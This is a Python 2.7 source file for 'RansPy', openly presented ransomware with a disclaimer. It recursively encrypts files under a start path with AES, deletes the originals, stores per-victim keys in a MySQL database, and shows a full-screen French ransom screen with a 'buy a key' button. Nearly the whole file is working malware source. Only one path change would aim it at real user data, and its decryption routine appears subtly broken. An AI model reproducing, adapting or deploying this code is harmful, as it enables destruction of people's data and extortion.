#!/usr/bin/env python
#-*- coding: utf-8 -*-

# Ranspy - Python 2.7
# (c) Copyright 2017. All rights reserved.
# by Quentin KLYMYK
# Credits to Marcos Valle (https://github.com/marcosValle/RansPy)

# Disclaimer : The use of this software is dangerous and you are responsible for the compatibility of this software with your software and hardware. You are also responsible for protecting your equipment and data. I will not be liable for any damages you may suffer as a result of using, modifying or distributing this software.

# Imports
import os, sys
from Tkinter import *
from Crypto.Cipher import AES
import random
import struct
import MySQLdb
import glob2
import base64
import time
import webbrowser

# GLOBALS
# Colors
color_white = "#FFF"
color_black = "#000"
color_grey = "#777"
color_red = "#EF3125"
color_green = "#43A047"
# Fonts
medium_font = ('Arial', 25)
large_font = ('Arial', 30)
big_font = ('Arial', 40)
# Encrypt & Decrypt
global startPath
startPath = "C:/RansPy/**/*"
extension = ".encrypted"
encrypt_code = ""
full_path = ""
path_segments = startPath.rsplit('/')
for segment in path_segments:
    first_char_segment = segment[:1]
    if(first_char_segment != " " and first_char_segment != "*"):
        full_path = full_path + segment + "\\"
full_path = full_path[:-1]
# Computer name
software_key_first = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(5))
software_key_second = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(5))
software_key_third = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(5))
software_key_fourth = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(5))
software_key = software_key_first + "-" + software_key_second + "-" + software_key_third + "-" + software_key_fourth
software_key_encoded = base64.b64encode(software_key)

# Marcos Valle functions
# AES-128 encrypt/decrypt
def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + extension

    iv = os.urandom(16) 
    encryptor = AES.new(key ,AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)

def start_encrypt(key):
    #Encrypts all files recursively starting from startPath
    for filename in glob2.iglob(startPath):
        if(os.path.isfile(filename)):
            #print('Encrypting> ' + filename)
            if(os.path.splitext(filename)[1] != extension):
                encrypt_file(key, filename)
                os.remove(filename)

def start_decrypt(key):
    #Decrypts the files
    for filename in glob2.iglob(startPath):
        if(os.path.isfile(filename)):
            fname, ext = os.path.splitext(filename)
            if (ext == extension):
                #print('Decrypting> ' + filename)
                decrypt_file(key, filename)
                os.remove(filename)

# My functions
def generate_encrypt_key():
    # Database operations
    db = MySQLdb.connect("localhost","root","root","ranspy" )
    cursor = db.cursor()
    request = "SELECT decrypt_key FROM ranspy_keys WHERE software_key='" + software_key_encoded + "'"
    cursor.execute(request)
    result_request = cursor.fetchone()
    if result_request is None:
        # Generate Key
        keygen = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(16))
        keygen_encoded = base64.b64encode(keygen)
        request = "INSERT INTO ranspy_keys VALUES ('%s','%s','%s')" % (software_key_encoded, keygen_encoded, time.strftime('%Y-%m-%d %H:%M:%S'))
        cursor.execute(request)
        db.close()
    elif result_request is not None:
        keygen_encoded = result_request[0]
        db.close()
    
    # Return key
    return keygen_encoded

def encrypt():
    # Encrypt function
    encrypt_code = generate_encrypt_key()
    start_encrypt(base64.b64decode(generate_encrypt_key()))
    return encrypt_code

def decrypt(event):
    # Decrypt function
    decrypt_code_encoded = base64.b64encode(str(decrypt_entry.get()))
    if(decrypt_code_encoded != encrypt_code or decrypt_code_encoded == ""):
        decrypt_entry.delete(0, END)
        decrypt_entry.insert(0, "")
        fail_decrypt_frame.tkraise()
    else:
        start_decrypt(base64.b64encode(decrypt_code_encoded))
        success_decrypt_frame.tkraise()
    
def buy():
    # Buy function
    # Link for get decrypt code
    webbrowser.open("http://localhost/ranspy/")
    
def createMainFrame(window):
    # Globals
    global main_frame
    global decrypt_entry
    # Main Frame
    main_frame = Frame(window)
    main_frame.place(in_=window, anchor="c", relx=.5, rely=.5)
    # Widgets
    Label(main_frame, text="ATTENTION !\nVos données ont été cryptées !", font=big_font, fg=color_red).grid(row=1, column=1, columnspan=3)
    Label(main_frame, text="Données cryptées dans : ", font=medium_font).grid(row=2, column=1, columnspan=3, padx=0, pady=(50,0), sticky=W)
    Label(main_frame, text=full_path, font=medium_font).grid(row=2, column=2, columnspan=3, padx=(20,0), pady=(50,0), sticky=W)
    Label(main_frame, text="Clé d'application : " , font=medium_font).grid(row=3, column=1, columnspan=3, padx=0, pady=(50,0), sticky=W)
    software_entry = Entry(main_frame, width=30, font=medium_font, bg="#F0F0F0", relief=FLAT)
    software_entry.grid(row=3, column=2, columnspan=2, padx=5, pady=(50,0))
    software_entry.delete(0, END)
    software_entry.insert(0, software_key)
    Label(main_frame, text="Clé de décryptage :", font=medium_font).grid(row=4, column=1, padx=0, pady=(50,0), sticky=W)
    decrypt_entry = Entry(main_frame, width=20, font=medium_font, highlightbackground=color_grey, highlightcolor=color_grey, highlightthickness=1)
    decrypt_entry.grid(row=4, column=2, columnspan=1, padx=(20,0), pady=(50,0))
    decrypt_entry.bind('<Return>', decrypt)
    decrypt_entry.focus()
    Button(main_frame, text='ACHETER UNE CLÉ', command=buy, width=19, height=2, font=medium_font, bg=color_green, fg=color_white).grid(row=5, column=1, padx=0, pady=(50,0), sticky=W)
    Button(main_frame, text='QUITTER', command=lambda:close_frame.tkraise(), width=10, height=2, font=medium_font, bg=color_red, fg=color_white).grid(row=5, column=3, padx=0, pady=(50,0), sticky=E)

def createCloseFrame(window):
    # Globals
    global close_frame
    # Close Frame
    close_frame = Frame(window, highlightbackground=color_black, highlightcolor=color_black, highlightthickness=3)
    close_frame.place(in_=window, anchor="c", relx=.5, rely=.5)
    # Widgets
    Label(close_frame, text="Vous ne pourrez plus décrypter vos données.", font=large_font, fg=color_red).grid(row=1, column=1, columnspan=2, padx=25, pady=(15,0))
    Label(close_frame, text="Voulez-vous vraiment quitter ?", font=medium_font).grid(row=2, column=1, columnspan=2, padx=0, pady=25)
    Button(close_frame, text='NON', command=lambda:main_frame.tkraise(), width=7, height=2, font=medium_font, bg=color_green, fg=color_white).grid(row=3, column=1, padx=0, pady=(0,25))
    Button(close_frame, text='OUI', command=window.destroy, width=7, height=2, font=medium_font, bg=color_red, fg=color_white).grid(row=3, column=2, padx=0, pady=(0,25))

def createFailDecryptFrame(window):
    # Globals
    global fail_decrypt_frame
    # Success Decrypt Frame
    fail_decrypt_frame = Frame(window, highlightbackground=color_red, highlightcolor=color_red, highlightthickness=3)
    fail_decrypt_frame.place(in_=window, anchor="c", relx=.5, rely=.5)
    # Widgets
    Label(fail_decrypt_frame, text="Clé invalide !\nVeuillez ressaisir votre clé de décryptage.", font=large_font, fg=color_red).grid(row=1, column=1, columnspan=3, padx=25, pady=(15,0))
    Button(fail_decrypt_frame, text='OK', command=lambda:main_frame.tkraise(), width=7, height=2, font=medium_font, bg=color_red, fg=color_white).grid(row=2, column=2, padx=0, pady=(25))

def createSuccessDecryptFrame(window):
    # Globals
    global success_decrypt_frame
    # Success Decrypt Frame
    success_decrypt_frame = Frame(window, highlightbackground=color_green, highlightcolor=color_green, highlightthickness=3)
    success_decrypt_frame.place(in_=window, anchor="c", relx=.5, rely=.5)
    # Widgets
    Label(success_decrypt_frame, text="Clé valide !\nVos données ont été décryptées.", font=large_font, fg=color_green).grid(row=1, column=1, columnspan=3, padx=25, pady=(15,0))
    Button(success_decrypt_frame, text='OK', command=window.destroy, width=7, height=2, font=medium_font, bg=color_green, fg=color_white).grid(row=2, column=2, padx=0, pady=(25))


# The Base64 icon version as a string
icon = 'AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAAAAAAAAA' \
'AAAAAAAAAAAAAAAAAAD///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wGMk/kohoz5KICM+SiGjPkohoz5KIaM+SiGjPkohoz5KIaM' \
'+SiGjPkohoz5KIaM+SiGjPkohoz5KIaM+SiGjPkohoz5KIaM+SiGjPkohoz5KICM' \
'+SiAjPkogIz5KGx58ij///8B////Af///wH///8B////Af///wEkMe7/JTHu/yUx' \
'7v8lMe7/JTHu/yUx7v8lMe7/JTHu/yUx7f8lMe7/JDHu/yUx7v8lMe7/JTHu/yUx' \
'7v8lMe7/JDHu/yQx7v8kMe7/JDHu/yQx7v8kMe7/JDHu/yUx7v8lMe7/JTHu/yUy' \
'7v8kMe7/////Af///wH///8BJTHu/yUx7v8lMe3/JDHt/yUx7f8lMu3/JTLt/yUy' \
'7f8lMu3/JDHu/yQw7v8kMe3/JDHt/yQx7f8kMe3/JDHt/yUx7f8kMe3/JDHt/yQx' \
'7f8kMe3/JDHt/yQx7f8kMe3/JDHt/yQx7f8lMe3/JjLu/yQx7v8lMe7/////ASs3' \
'7v8kMe7/JDHt//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/JTHu/yUx7v8rN+76JDHu/yUx7v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/f4fz/JTHu/yUx7v8lMe7/JTHu//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/bXXz/yQx7v8lMe7/JTHu/yQx7v8kMO7/JTHu/yQx7v8lMe7/JTHu/yQx' \
'7v+orfj/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+/+zt/f8kMe7/JTHu/yQx' \
'7f8kMe7/JDDt//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v8lMe7/JDHu/yUy' \
'7v8lMe7/JTHu/yUx7f8lMe7/JDHu/yQx7v8lMe7/JTHu/yUx7v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/JTHu/yUx7v8kMe3/v7/qDCQx7v8kMe7/9/f+//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/+fn+/yQw7v8kMe7/JTHu/yUx7v9ZY/H/+fn+//n5' \
'/v9XYfH/JTHu/yQx7v8kMe7/JDHu//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+/9LV' \
'+/8lMe7/JTHu/7+/6gz///8BJDHt/yQx7v8kMe7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/JDHu/yQx7v8lMu7/JTHu//n5/v8kMe3/JTHu//n5/v8lMe7/JTHu/yUx' \
'7v8lMe7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/JDHu/yQx7v8kMe3/////Af//' \
'/wH///8BJTHu/yUx7v+kqfj/+fn+//n5/v/5+f7/+fn+//n5/v8kMO7/JDHu/yUx' \
'7v8kMe7/JTHu/yMw7f+Tmfb/+fn+/yUx7v8kMe7/JDHu/yQx7v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+/1Bb8f8kMe7/JTHu/////wH///8B////Af///wFFUfDsJTHu/yQx' \
'7v/5+f7/+fn+//n5/v/5+f7/+fn+/yQx7v8kMe7/JTHu/yQx7v/5+f7/+fn+/+nq' \
'/f8kMe7/JTHu/yQx7v8kMe7/JDHu//n5/v/5+f7/+fn+//n5/v/5+f7/JDHu/yUx' \
'7v87R+/b////Af///wH///8B////Af///wElMu7/JTHu/zM/7//5+f7/+fn+//n5' \
'/v/5+f7/JDHu/yQx7v8lMe7/JDHu//n5/v8kMe3/JDHt//n5/v8lMe7/JDHu/yUx' \
'7v8kMe7/+fn+//n5/v/5+f7/+fn+/yQx7f8kMe7/JTHu/////wH///8B////Af//' \
'/wH///8B////AXp/81YkMO7/JTHu//n5/v/5+f7/+fn+//n5/v8kMO7/JTLu/yQx' \
'7v8kMe7/tLj4//n5/v/5+f7/g4v1/yUx7v8lMe7/JTHu/yQx7v/5+f7/+fn+//n5' \
'/v/29v7/JDHu/yUx7v+Fi/NW////Af///wH///8B////Af///wH///8B////ASQx' \
'7f8kMe7/JDDt//n5/v/5+f7/+fn+/yUx7v8lMe7/JDHu/yQw7v8lMe7/JDDt/yUx' \
'7v8kMe7/JDHu/yQx7v8kMe7/JTHu//n5/v/5+f7/+fn+/yUx7v8kMe7/JTHt////' \
'/wH///8B////Af///wH///8B////Af///wH///8B////ASUx7v8lMe7/6uv9//n5' \
'/v/5+f7/c3v0/yUy7v8kMe7/JTHu/yUx7f8lMe3/JTHt/yUx7f8lMe7/JDHu/yQx' \
'7v9dZ/L/+fn+//n5/v+kqff/JTHu/yQw7v////8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8BJjPt/yUx7v8lMe7/+fn+//n5/v/5+f7/JDDt/yQx' \
'7v+hp/f/+fn+//n5/v/5+f7/+fn+/5KY9v8kMe7/IzDt//n5/v/5+f7/+fn+/yUx' \
'7v8lMe7/KDTu/////wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8BJTHu/yUx7v9+hvX/+fn+//n5/v8jMO3/JDHu/4CH9f/5+f7/+fn+//n5' \
'/v/5+f7/c3z0/yQx7v8iL+3/+fn+//n5/v80QO//JDHu/yQx7v////8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wFHU/HFJTHu/yUx' \
'7v/5+f7/+fn+/6Cl9/8lMe7/JDHu//n5/v/5+f7/+fn+//n5/v8kMe7/JDHu/6yx' \
'+P/5+f7/+fn+/yUx7v8kMe7/Ulvxu////wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wElMe7/JTHu/yk17v/5+f7/+fn+/yUx' \
'7f8kMe7/JTHu/yUx7v8lMe7/JTHu/yQw7v8kMe3/+fn+//n5/v8lMe7/JTHu/yUx' \
'7v////8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////AYmS8TglMe7/JTHu//n5/v/5+f7/+fn+/yQx7f8lMu7/JTLu/yUy' \
'7v8lMu7/JDHt//n5/v/5+f7/6On8/yUx7v8lMe7/h4/3IP///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ASQx' \
'7f8lMe7/JTHu//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v8lMe7/JTHu/yQx7f////8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////ASQx7v8lMe7/1tn7//n5' \
'/v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/cXrz/yQx7v8lMe7/////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8BKjfu/iQx7v8kMe7/+fn+//n5/v/5+f7/+fn+//n5' \
'/v/5+f7/+fn+//n5/v8kMe7/JTHu/zE97/r///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8BJTHu/yUx7v9aZPL/+fn+//n5/v/5+f7/+fn+//n5/v/5+f7/JTHt/yQx' \
'7v8lMe7/////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wFMVvCeJDHu/yUx' \
'7v/5+f7/+fn+//n5/v/5+f7/+fn+//n5/v8kMe7/JTHu/1hi8YL///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wElMe3/JTHu/yMw7f/5+f7/+fn+//n5' \
'/v/5+f7/JTHu/yQx7v8lMe3/////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Aaqz9x4lMe7/JDHu/8PG+v/5+f7/+fn+/11n8v8kMe7/JTHu/8zd' \
'/w////8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ASMw' \
'7f8kMe7/JDHu/yUy7v8lMe7/JTHu/yUx7v8kMe3/////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////ASMw7f8lMe7/JTLu/yUx' \
'7v8lMu7/JTLt/v///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wFpcPNrhov1Y////wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af//' \
'/wH///8B////Af///wH///8B////Af///wH///8BAAAAAA////AAAAAAAAAAAAAA' \
'AAEAAAAAAAAAAAAAAACAAAABAAAAAAAAAAAgAAAAAAAAABAAAAgAAAAAAAAAAAAA' \
'AAAAAAAAAAAAAAAAAAABAACAAAAAAAAAAAAAQAIAAAAAAAAgBAAAAAAAABAAAAAA' \
'AAAAACAAAAAAAAAAAAA='
icondata= base64.b64decode(icon)
# The temp file is icon.ico
tempFile= "icon.ico"
iconfile= open(tempFile,"wb")
# Extract the icon
iconfile.write(icondata)
iconfile.close()

# Main Window
window = Tk()
window.title('RansPy')
window.attributes("-fullscreen", True)
window.resizable(width=False, height=False)

# Use icon
window.wm_iconbitmap(tempFile)
# Delete the tempfile
os.remove(tempFile)

# Frames
createMainFrame(window)
createSuccessDecryptFrame(window)
createFailDecryptFrame(window)
createCloseFrame(window)

# Start
encrypt_code = encrypt()
main_frame.tkraise()
window.mainloop()